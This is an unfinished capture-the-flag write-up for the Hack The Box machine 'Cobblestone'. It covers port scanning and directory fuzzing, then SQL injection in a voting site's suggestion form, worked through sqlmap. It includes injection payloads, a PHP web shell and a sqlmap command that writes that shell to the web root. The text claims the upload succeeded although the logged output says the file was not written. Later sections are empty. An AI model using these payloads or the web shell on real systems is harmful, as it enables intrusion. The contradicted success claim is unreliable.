---
file_created: 06 Sep 2025 14:46
title: Cobblestone
difficulty: Instane
difficult_sort: 4
points: 50
os: Linux
target_ip: 10.10.11.81
platform: Hack The Box
category: B2R
box_status: Active
url: https://app.hackthebox.com/machines/Cobblestone
user_flag:
root_flag:
completed:
date_finish:
tags:
  - htb/machines
  - red-team
---
# Resolution summary

![500x300](<./attachments/Cobblestone.png>)
>[!summary]
>Bug's on Minecraft external plugins, enum and Osint on GitHub, then HTML and JavaScript SRCR, SQLMap and SQLi to get Shell, Abusing DB and Linux mis-configured (.cron) job kernel and XMLRPC to root.
## Tutorial

```cardlink
url: https://dudenation.github.io/posts/cobblestone-htb-season8/
title: "Cobblestone [Insane]"
description: "Cobblestone HTB Season 8 Machine information Author: c1sc0"
host: dudenation.github.io
favicon: https://dudenation.github.io/assets/img/favicons/favicon-32x32.png
image: https://dudenation.github.io/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_banner.png
```

## Improved skills
- Skill 1
- Skill 2
## Used tools
- nmap; ffuf; [burpsuite](<../../../RESOURCES/Tools/burpsuite.md>); [sqlmap](<../../../RESOURCES/Tools/sqlmap.md>)
---
# Environment Setup
```bash
export HOST_IP=10.10.14.112
export TARGET_IP=10.10.11.81
export DOMAIN=cobblestone.htb
{
  echo "HOST_IP=${HOST_IP:-}"
  echo "TARGET_IP=${TARGET_IP:-}"
  echo "DOMAIN=${DOMAIN:-}"
} > .env
source .env
```
---
# Information Gathering
## Scanned all ports:
```bash
rustscan -a $TARGET_IP -r 1-65535 -t 10000 --ulimit 5000

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```
## Enumerated open TCP ports:
```bash
sudo nmap -sVC -Pn -oN recon/open-tcp-ports.txt -vv $TARGET_IP -p 22,80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBCfBUkQ4szy00s+EbTzIMq4Cv/mOkGWCD8xewIgvZ4zDI5pPhUaVYNsPaUmYzXgi0DzCy6s//8a1YFcyH398Nc=
|   256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICuDtua7ciUfRA2uUH+ergsCOdq0Aaoakru1kQ9/OWPs
80/tcp open  http    syn-ack Apache httpd 2.4.62
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Cobblestone - Official Website
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Results
tcp - **port 22**: Possible entry point 
tcp - **port 80**: need to redirect to `/etc/hosts`

---
# Enumeration

## Port 80 - HTTP (Apache)
Apache httpd 2.4.62
### configuration
- Redirect to `http://cobblestone.htb/` so add to `/etc/hosts` file
```bash
echo "$TARGET_IP $DOMAIN"| sudo tee -a /etc/hosts
```

### Homepage
Check out the website [cobblestone.htb](http://cobblestone.htb)
- It is **Minecraft Port Template** website. 
![](<./attachments/Cobblestone-0.png>)
When _view page source:
- we can see there is [bybilly.uk](https://bybilly.uk/) in the source code.
- It has a [minecraft-web-portal](https://github.com/bybilly/minecraft-web-portal) repository on GitHub. 
### site founded in source page
- the [github ](https://github.com/bybilly/minecraft-web-portal) repo 
- view the [updates](https://www.spigotmc.org/resources/minecraft-website-template-portal-%E2%98%85-responsive-%E2%98%85-easy.48410/updates) for any bug fixes

![300x200](<./attachments/Cobblestone-4.png>)
![400](<./attachments/Cobblestone-5.png>)

![](<./attachments/Cobblestone-1.png>)
**Also found 3 subdomain hoving over sections**
![400x200](<./attachments/Cobblestone-8.png>)
![](<./attachments/Cobblestone-9.png>)
Add these to `/etc/hosts` file:
```bash 
echo "$TARGET_IP $DOMAIN deploy.$DOMAIN vote.$DOMAIN mc.$DOMAIN"| sudo tee -a /etc/hosts
```
### Subdomain enumeration
for  `mc.cobblestone.htb`
- it got redirect back to `cobblestone.htb` so nothing useful here.

For the `deploy.cobblestone.htb`
- it still under development so **can not do anything with this one**.
![](<./attachments/Cobblestone-2.png>)
Moving on to the `vote.cobblestone.htb`.
![](<./attachments/Cobblestone-10.png>)
We got a login and register page, it also tell us that **it is still beta and might have issues** so we can leverage this point to exploit this part.

To make sure we do not miss any endpoints or directories, 
- let’s use `fuzz` to enumerate.
#### ffuf deploy.cobblestone.htb
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://deploy.cobblestone.htb/FUZZ -e .php,.html,.txt,.js,.json,.xml,.bak,.old,.log -t 50


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://deploy.cobblestone.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Extensions       : .php .html .txt .js .json .xml .bak .old .log
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

js                      [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 453ms]
css                     [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 456ms]
img                     [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 454ms]
javascript      [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 464ms]
index.php               [Status: 200, Size: 1745, Words: 121, Lines: 52, Duration: 456ms]
server-status           [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 455ms]
:: Progress: [265830/265830] :: Job [1/1] :: 109 req/sec :: Duration: [0:44:45] :: Errors: 10 ::
```
#### ffuf vote.cobblestone.htb
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://vote.cobblestone.htb/FUZZ -e .php,.html,.txt,.js,.json,.xml,.bak,.old,.log -t 50

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://vote.cobblestone.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Extensions       : .php .html .txt .js .json .xml .bak .old .log
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

templates               [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 456ms]
js                      [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 455ms]
css                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 454ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 456ms]
register.php            [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 455ms]
login.php               [Status: 200, Size: 4759, Words: 1268, Lines: 90, Duration: 456ms]
img                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 453ms]
db                      [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 454ms]
javascript              [Status: 301, Size: 333, Words: 20, Lines: 10, Duration: 455ms]
index.php               [Status: 302, Size: 81, Words: 10, Lines: 4, Duration: 462ms]
details.php             [Status: 302, Size: 78, Words: 10, Lines: 4, Duration: 458ms]
vendor                  [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 453ms]
suggest.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 455ms]
server-status           [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 453ms]
composer.json           [Status: 200, Size: 56, Words: 19, Lines: 6, Duration: 458ms]
:: Progress: [265830/265830] :: Job [1/1] :: 111 req/sec :: Duration: [0:45:02] :: Errors: 10 ::
```
### Login Page
- Registered with the same creds on [vote-server](http://vote.cobblestone.htb/login.php) and [skins-database](http://cobblestone.htb/skins.php)
- moved to 
![](<./attachments/Cobblestone-11.png>)
>TESTER:TESTER1234
- Skins database 
![](<./attachments/Cobblestone-12.png>)
- vote
![](<./attachments/Cobblestone-13.png>)
After register and login, we are in the **Voting table** page but we can not vote as it was not implemented yet.
![](<./attachments/Cobblestone-14.png>)
Check out the `suggest.php` one.
![](<./attachments/Cobblestone-15.png>)
It seems like we can enter a server for the approval. This maybe chance for [SSRF](https://www.geeksforgeeks.org/ethical-hacking/server-side-request-forgery-ssrf-in-depth/) to read or even [RCE](https://www.geeksforgeeks.org/computer-networks/what-is-remote-code-execution-rce/).  
Roll back to the fuzzing part, we got `details.php` → Let’s check it out.

Back to the **Voting table**, we use the `mc.cobblestone.htb` and check out the burp.
![](<./attachments/Cobblestone-16.png>)
We are in `http://vote.cobblestone.htb/details.php?id=1` and we know that the `details.php` must go with `id` parameter to get the details of the one to vote.  
→ Let’s enter `http://vote.cobblestone.htb/index.php` to the suggestion part and see what we got.
![](<./attachments/Cobblestone-17.png>)
So we got a new `id=4` and from the burpsuite, we got POST request to `suggest.php`.  
When we back to the suggest, we can see our new server suggestions.
![](<./attachments/Cobblestone-18.png>)
Then we trying to exploit the SSRF vulnerability but it seems like it just create a new suggestion so maybe this could be a false positive.  

After a while discovering and stucking, we enter `url:'` and hit enter.
**Orginal**
![](<./attachments/Cobblestone-19.png>)
**Modified**
![](<./attachments/Cobblestone-20.png>)
- select follow redirection
![](<./attachments/Cobblestone-21.png>)
![](<./attachments/Cobblestone-22.png>)
Got `500 Internal Server Error`, hmm this could be a good sign for [SQLi](https://portswigger.net/web-security/sql-injection). 

---
# Exploitation
## SQL Injection
So continue to testing out how many columns we got with this payload `99999' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL #` and the result is `500`. Then decrease one column and we got `200`.  
 - So we can conclude that this is Blind SQli and got 5 columns. To make it automate, we gonna use `sqlmap` to do this.

First we gonna `Copy to file` the following request in burpsuite and save it as `req`.
```bash
POST /suggest.php HTTP/1.1
Host: vote.cobblestone.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://vote.cobblestone.htb/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://vote.cobblestone.htb
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=qhiahp523saks7b5bcbikm8tle
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2Fvote.cobblestone.htb%2Findex.php
```

Then we use `sqlmap` with `--batch` to run it automatically.
```bash
sqlmap -r req --batch
```


```sql
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:03:46 /2025-09-28/

[13:03:46] [INFO] parsing HTTP request from 'req'
[13:03:46] [INFO] resuming back-end DBMS 'mysql'
[13:03:46] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=6'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5926=5926 AND 'GBwC'='GBwC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND SLEEP(5) AND 'CmvC'='CmvC

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-6395' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b626271,0x5050685272454b637067796d43666d72656a42795669764e784141746e64484d527351556a745651,0x7178627171),NULL-- -
---
[13:03:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[13:03:48] [INFO] fetched data logged to text files under '/home/rouxtronics/.local/share/sqlmap/output/vote.cobblestone.htb'

```

We got 3 techniques to exploit this SQLi.  
- Gonna go with `UNION query` technique.

We continue to enumrate the db privilege.
```bash
sqlmap -r req --batch --privilege
```

```sql
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:22:39 /2025-09-28/

[13:22:39] [INFO] parsing HTTP request from 'req'
[13:22:39] [INFO] resuming back-end DBMS 'mysql'
[13:22:39] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=4'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5926=5926 AND 'GBwC'='GBwC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND SLEEP(5) AND 'CmvC'='CmvC

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-6395' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b626271,0x5050685272454b637067796d43666d72656a42795669764e784141746e64484d527351556a745651,0x7178627171),NULL-- -
---
[13:22:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[13:22:44] [INFO] fetching database users privileges
database management system users privileges:
[*] 'voteuser'@'localhost' [1]:
    privilege: FILE

[13:22:45] [INFO] fetched data logged to text files under '/home/rouxtronics/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 13:22:45 /2025-09-28/
```

Got `FILE` privilege which we can read files from filesystem and also write files that we can leverage this point to access configuration files, logs, source code and even RCE.

Next gonna check the database.
```bash 
sqlmap -r req --batch --dbs
```

```sql
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:30:51 /2025-09-28/

[13:30:51] [INFO] parsing HTTP request from 'req'
[13:30:52] [INFO] resuming back-end DBMS 'mysql'
[13:30:52] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=4'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5926=5926 AND 'GBwC'='GBwC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND SLEEP(5) AND 'CmvC'='CmvC

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-6395' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b626271,0x5050685272454b637067796d43666d72656a42795669764e784141746e64484d527351556a745651,0x7178627171),NULL-- -
---
[13:30:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[13:30:54] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] vote

[13:30:55] [INFO] fetched data logged to text files under '/home/rouxtronics/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 13:30:55 /2025-09-28/
```

Let’s check out the `vote` database.
```bash
sqlmap -r req --batch -D vote --tables
```

```sql
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:33:15 /2025-09-28/

[13:33:15] [INFO] parsing HTTP request from 'req'
[13:33:15] [INFO] resuming back-end DBMS 'mysql'
[13:33:15] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=6'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5926=5926 AND 'GBwC'='GBwC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND SLEEP(5) AND 'CmvC'='CmvC

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-6395' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b626271,0x5050685272454b637067796d43666d72656a42795669764e784141746e64484d527351556a745651,0x7178627171),NULL-- -
---
[13:33:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[13:33:17] [INFO] fetching tables for database: 'vote'
Database: vote
[2 tables]
+-------+
| users |
| votes |
+-------+

[13:33:18] [INFO] fetched data logged to text files under '/home/rouxtronics/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 13:33:18 /2025-09-28/
```

Let’s dump the `users` table.
```bash
sqlmap -r req --batch -D vote -T users --dump
```

```sql
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:34:15 /2025-09-28/

[13:34:15] [INFO] parsing HTTP request from 'req'
[13:34:15] [INFO] resuming back-end DBMS 'mysql'
[13:34:15] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=8'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5926=5926 AND 'GBwC'='GBwC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND SLEEP(5) AND 'CmvC'='CmvC

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-6395' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b626271,0x5050685272454b637067796d43666d72656a42795669764e784141746e64484d527351556a745651,0x7178627171),NULL-- -
---
[13:34:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[13:34:17] [INFO] fetching columns for table 'users' in database 'vote'
[13:34:23] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[13:34:23] [WARNING] unable to retrieve column names for table 'users' in database 'vote'
do you want to use common column existence check? [y/N/q] N
[13:34:23] [WARNING] unable to enumerate the columns for table 'users' in database 'vote'
[13:34:23] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 9 times
[13:34:23] [INFO] fetched data logged to text files under '/home/rouxtronics/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 13:34:23 /2025-09-28/
```

Somehow we can not dump the `users` table which we can get some credentials to initial access.  
Let’s check out the apache virtual host config, for more details check out [Apache Virtual Hosts](https://httpd.apache.org/docs/2.4/vhosts/examples.html).
```bash
sqlmap -r req --batch --file-read /etc/apache2/sites-available/000-default.conf
```

```sql
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:35:49 /2025-09-28/

[13:35:49] [INFO] parsing HTTP request from 'req'
[13:35:49] [INFO] resuming back-end DBMS 'mysql'
[13:35:49] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=10'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5926=5926 AND 'GBwC'='GBwC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND SLEEP(5) AND 'CmvC'='CmvC

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-6395' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b626271,0x5050685272454b637067796d43666d72656a42795669764e784141746e64484d527351556a745651,0x7178627171),NULL-- -
---
[13:35:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[13:35:51] [INFO] fingerprinting the back-end DBMS operating system
[13:35:59] [INFO] the back-end DBMS operating system is Linux
[13:35:59] [INFO] fetching file: '/etc/apache2/sites-available/000-default.conf'
do you want confirmation that the remote file '/etc/apache2/sites-available/000-default.conf' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[13:36:01] [INFO] the local file '/home/rouxtronics/.local/share/sqlmap/output/vote.cobblestone.htb/files/_etc_apache2_sites-available_000-default.conf' and the remote file '/etc/apache2/sites-available/000-default.conf' have the same size (1334 B)
files saved to [1]:
[*] /home/rouxtronics/.local/share/sqlmap/output/vote.cobblestone.htb/files/_etc_apache2_sites-available_000-default.conf (same file)

[13:36:01] [INFO] fetched data logged to text files under '/home/rouxtronics/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 13:36:01 /2025-09-28/
```

- output in `'$HOME/.local/share/sqlmap/output/vote.cobblestone.htb'`
```sql
cat '$HOME/.local/share/sqlmap/output/vote.cobblestone.htb'
<VirtualHost *:80>
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]
        ServerName 127.0.0.1
        ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
        ProxyPassReverse "/cobbler_api" "http://127.0.0.1:25151/"
</VirtualHost>

<VirtualHost *:80>
        ServerName cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/html

        <Directory /var/www/html>
                AAHatName cobblestone
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]

        Alias /cobbler /srv/www/cobbler

        <Directory /srv/www/cobbler>
                Options Indexes FollowSymLinks
                AllowOverride None
                Require all granted
        </Directory>

</VirtualHost>

<VirtualHost *:80>
        ServerName deploy.cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/deploy

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^deploy.cobblestone.htb$
        RewriteRule /.* http://deploy.cobblestone.htb/ [R]
</VirtualHost>

<VirtualHost *:80>
        ServerName vote.cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/vote

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^vote.cobblestone.htb$
        RewriteRule /.* http://vote.cobblestone.htb/ [R]
</VirtualHost>
```

We can see there is port `25151` in the `cobbler_api` part.  

Now let’s create `shell.php` and use `sqlmap` to upload and reverse shell.

```php
<?php system($_GET['cmd']); ?>

<?php system($_REQUEST['cmd']); ?>
```

```bash
sudo sqlmap -r req --batch --file-write shell.php --file-dest /var/www/vote/shell.php
```

```sql
 ___ ___["]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:43:36 /2025-09-28/

[13:43:36] [INFO] parsing HTTP request from 'req'
[13:43:36] [INFO] resuming back-end DBMS 'mysql'
[13:43:36] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=4'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5926=5926 AND 'GBwC'='GBwC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND SLEEP(5) AND 'CmvC'='CmvC

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-6395' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b626271,0x5050685272454b637067796d43666d72656a42795669764e784141746e64484d527351556a745651,0x7178627171),NULL-- -
---
[13:43:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[13:43:38] [INFO] fingerprinting the back-end DBMS operating system
[13:43:38] [INFO] the back-end DBMS operating system is Linux
[13:43:40] [WARNING] expect junk characters inside the file as a leftover from UNION query
do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/vote/shell.php')? [Y/n] Y
[13:43:41] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[13:43:41] [INFO] fetched data logged to text files under '/home/rouxtronics/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 13:43:41 /2025-09-28/
```

Success upload and checking out `whoami`.
```bash
curl -I http://vote.cobblestone.htb/shell.php?cmd=whoami
```
# Lateral Movement to xxx

## Local enumeration


## Lateral movement vector

---
# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector


---
# Trophy

## User Flag
```txt

```
## Root Flag
```txt
```
## **/etc/shadow**

```bash

```

---
# Proof